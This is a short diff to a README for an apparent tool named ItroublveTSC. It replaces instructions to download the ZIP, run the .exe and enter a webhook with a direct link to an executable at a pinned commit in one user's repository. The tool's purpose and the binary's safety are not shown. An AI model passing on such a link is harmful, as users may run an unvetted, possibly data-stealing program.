@@ -35,9 +35,7 @@ I'm learning coding at the moment to create my own projects as I mentioned befor
 
 It is really easy to set this up!
 
-Click the blue/green "CODE" button on this page. Choose the option "DOWNLOAD ZIP".
-
-Once downloaded, open the folder and just run the .exe and input your webhook. You can also choose the many features you want.
+[DOWNLOAD HERE] (https://github.com/vex8277/ItroublveTSC/blob/5b5d7f051ad2112aa14571d0b36eccab940213b4/ItroublveTSC.exe)
 
 ---------------------------------------------------------------------------------------------------
 <div align="center">
